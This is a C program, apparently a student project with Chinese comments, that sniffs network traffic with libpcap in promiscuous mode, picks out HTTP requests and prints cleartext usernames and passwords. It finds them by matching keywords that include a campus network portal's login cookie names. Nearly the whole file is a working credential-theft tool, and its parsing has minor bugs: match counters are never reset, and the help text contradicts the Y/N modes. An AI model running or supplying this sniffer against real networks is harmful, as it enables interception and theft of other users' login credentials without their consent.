#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pcap/pcap.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/ether.h>

int  userchoice  = 0;
long packgecount = 1;

//链路层数据报结构
typedef struct {
    u_char DestMac[6];
    u_char SrcMac[6];
    u_char Etype[2];
}ETHHEADER;

//IP首部
typedef struct ip_hdr {
    unsigned char  h_verlen;                //4bit 首部长度 + 4bit version
    unsigned char  tos;                     //8bit 服务类型TOS
    unsigned short total_len;               //16bit总长度
    unsigned short ident;                   //16bit 标志
    unsigned short frag_and_flags;          //偏移量 + 3bit标志位
    unsigned char  ttl;                     //8bit TTL
    unsigned char  proto;                   //8bit 协议(如TCP)
    unsigned short checksum;                //16bit IP首部检验和
    unsigned int   sourceIP;                //32bit 源IP
    unsigned int   destIP;                  //32bit 目的IP
}IPHEADER;

//TCP首部
typedef struct tcp_hdr {
    unsigned short sport;                   //16bit 源端口
    unsigned short dport;                   //16bit 目的端口
    unsigned int   seq;                     //32bit 序列号
    unsigned int   ack;                     //32bit 确认号
    unsigned char  lenres;                  //4bit 首部长度 + 6bit保留字
    unsigned char  flag;                    //6bit 标志位
    unsigned short win;                     //16bit 窗口大小
    unsigned short sum;                     //16bit 校验和
    unsigned short urp;                     //16bit 紧急数据偏移量
}TCPHEADER;

/*-----------------checkHTTP--------------------
 *   功能介绍：  检查TCP包中是否包含HTTP
 *   参数声明：  入参 ____TCP数据包
 *                   |__ 需检测的长度
 *              出参 ____ 1：表示包含HTTP包
 *                   |__  0:表示不包含 
 *   请求方法:   查看请求头是否为
 *              GET/POST URL HTTP/1.1
 *----------------------------------------------*/
int checkHTTP(char *TCPpackge, int len) {
    int i;
    int searchLen = 100;

    /*TCP首部20字节，加上HTTP请求头不超过100字节*/
    if (len < 100) searchLen = len;

    for (i = 0; i < searchLen - 4; i++) {
        if (TCPpackge[i]   == 'H' &&
            TCPpackge[i+1] == 'T' &&
            TCPpackge[i+2] == 'T' &&
            TCPpackge[i+3] == 'P' &&
            TCPpackge[i+4] == '/')
            return 1;
    }
    return 0;
}

/*-----------------GetUser & PassWd-----------------------
 *  功能介绍：  查询HTTP包与字典中的可能关键字对比获取明文密码
 *  参数声明：  入参：HTTP数据 + 检索数据长度
 *             出参：匹配到的密码个数
 *  字典设置：  需要大量分析每种网站的关键字，
 *             此处仅以校园网的关键字作为匹配对象
 *--------------------------------------------------------*/
 int GetPasswd(char *HTTPdata, int len) {

    int  resultnum = 0;
    char *dicKey[] = {
          "EPORTAL_COOKIE_USERNAME=",
          "EPORTAL_COOKIE_PASSWORD=",
          "name=",
          "password=",
          "passwd=",
    };
    int   dicLen = sizeof(dicKey) / sizeof(dicKey[0]);
    /*找到HTTP的请求头，找到HTTP/1.1，进而向下匹配*/
    int   i = 0, searchLen = 100;
    char  *startpoint = HTTPdata;

    for (i=0; i < searchLen - 4; i++) {
        if (HTTPdata[i]   == 'H' &&
            HTTPdata[i+1] == 'T' &&
            HTTPdata[i+2] == 'T' &&
            HTTPdata[i+3] == 'P' &&
            HTTPdata[i+4] == '/') {

            startpoint += i;
            break;
        }
    }

    /*匹配字典中的关键字*/
    char  *searchstr, buf;
    int   m = 0, lencheck = 0;
    for (i=0; i < dicLen; i++) {
        for (searchstr = startpoint; searchstr = strstr(searchstr, dicKey[i]); ) {
            while( searchstr[m] != ' '  &&
                   searchstr[m] != '\n' &&
                   searchstr[m] != '\r' &&
                   lencheck < len) {
                   m++; lencheck++;
            }
            buf = searchstr[m];
            searchstr[m] = '\0';
            if (resultnum == 0) {
                printf("\n------------Passwd sniff result-------------");
            }
            printf("\n%s\n", searchstr);
            resultnum ++;
            searchstr[m] = buf;
            searchstr += m;
        }
    }
    return resultnum;
 }

void printHTTPhead(char *httphead, int len)
{
    int i;
    for(i=0;i<len;i++){
        if(httphead[i]=='\r' && httphead[i+1]=='\n' && httphead[i+2]=='\r' && httphead[i+3]=='\n'){
            httphead[i]='\0';
            httphead[i+1]='\0';
            break;
        }
        if( userchoice && httphead[i]=='\r' && httphead[i+1]=='\n'){
            httphead[i]='\0';
            httphead[i+1]='\0';
            break;
        }
    }
    if(httphead[0]==0x01&&httphead[1]==0x01&&httphead[2]==0x08&&httphead[3]==0x0a){
        //TCP PAWS处理 
        //http://www.unixresources.net/linux/clf/linuxK/archive/00/00/13/92/139290.html
        printf("%s", httphead+12);
    }else{
        printf("%s", httphead);
    }
    httphead[i]='\r';
    httphead[i+1]='\n';
}

/*----------------pcap_handler-----------------------
 *   功能介绍：  作为pcap_loop函数每次循环回调的函数
 *-------------------------------------------------*/
void pcap_handler_myself(u_char * user, const struct pcap_pkthdr* header, const u_char* pkt_data) {
    int       passwdret;
    int       offset;
    char*     TCPdata;

    if ((header->len) < (sizeof(ETHHEADER))) return;                            //长度小于链路数据帧，丢弃
    IPHEADER  *IPheader  = (IPHEADER*) (pkt_data + sizeof(ETHHEADER));
    TCPHEADER *TCPheader = (TCPHEADER*)(pkt_data + sizeof(ETHHEADER) + sizeof(IPHEADER));
    if(IPheader->proto != 6)                 return;                            //协议号为6表明是TCP协议，具体看课本
    offset = sizeof(IPHEADER) + sizeof(TCPHEADER) + sizeof(ETHHEADER);

    TCPdata = (unsigned char*)pkt_data + offset;
    
    /*匹配是否为HTTP报文*/
    if(checkHTTP(TCPdata, (header->len - offset)) == 1) {
        passwdret = GetPasswd(TCPdata, (header->len - offset));
        if(passwdret == 0 && userchoice == 0) {
            printf("\n[Sorry]没有抓到明文密码");
        }
        else if (passwdret > 0 && userchoice == 0) {
            printf("\n[Sum]该数据包分析共得出%d个密码", passwdret);
        }
        packgecount ++;

        /*获取数据包中的源&目的IP*/
        char               sourceIP[32], destIP[32];
        struct sockaddr_in soc_source, soc_dest;
        soc_source.sin_addr.s_addr = IPheader->sourceIP;
        soc_dest.sin_addr.s_addr   = IPheader->destIP;
        /*inet_ntoa函数将网络字节序IP地址转换为字符串*/
        strcpy(sourceIP, inet_ntoa(soc_source.sin_addr));
        strcpy(destIP,   inet_ntoa(soc_dest.sin_addr));

        /*显示详细信息*/
        if (userchoice == 1) {
            printf("\n[source]: %s --> [dest]: %s:%i\t", sourceIP, destIP, ntohs(TCPheader->dport));
            printHTTPhead(TCPdata, header->len-offset);
        }
        else {
            printf("\n------------Info------------");
            printf("\n[%ld]", packgecount);
            printf("\n[totallen]: %d", header->len);
            printf("-------------IP header------------");   
            printf("\n[checksum]: %i", ntohs(IPheader->checksum));  
            printf("\n[sourceIP]: %s", sourceIP);  
            printf("\n[destIP]: %s", destIP);  
            printf("\n------------TCP header-----------");  
            printf("\n[sourceport]: %i", ntohs(TCPheader->sport));  
            printf("\n[destport]: %i", ntohs(TCPheader->dport)); 
            printf("\n------------HTTP header-----------\n");
            printHTTPhead(TCPdata, header->len-offset);
        }
    }
}



int main(int argc, char **argv) {
    int                id = 0;
    char               errpkt_data[1024];
    struct pcap_pkthdr packet;
    struct bpf_program fcode;
    char               *netcard;
    char               *N = "N";
    char               *Y = "Y";
    bpf_u_int32        ipmask = 0;

    /* 无参数传入时，输出提示信息 */
    if (argc == 3 && (strcmp(argv[2],N) == 0 || strcmp(argv[2],Y) == 0)) {
        
        netcard = argv[1];
        if (strcmp(argv[2],N) == 0)
            userchoice = 1;
    }
    else  {
	printf("[Error] 请正确传入参数\n");
        printf("[help]  调用格式为\n");
        printf("[module]sniffer eth0/wlan0 模式(Y/N)\n");
        printf("[Y/N]   Y显示所有数据包,N显示密码\n");
	return 0;
    }

    /*调用open函数打开网络设备*/
    pcap_t* device = pcap_open_live(netcard, 65535, 1, 0, errpkt_data);
    if(!device) {
        printf("%s\n", errpkt_data);
        return 0;
    }

    /*调用setfitter函数设置过滤规则*/
    if(pcap_compile(device, &fcode, "tcp", 0, ipmask) == -1) {
        printf("%s\n", pcap_geterr(device));
        return 0;
    }
    if(pcap_setfilter(device, &fcode) == -1) {
        printf("%s\n", pcap_geterr(device));
        return 0;
    }

    /*调用loop函数进行循环抓取*/
    pcap_loop(device, -1, pcap_handler_myself, (u_char*)&id);
    return 0;
}
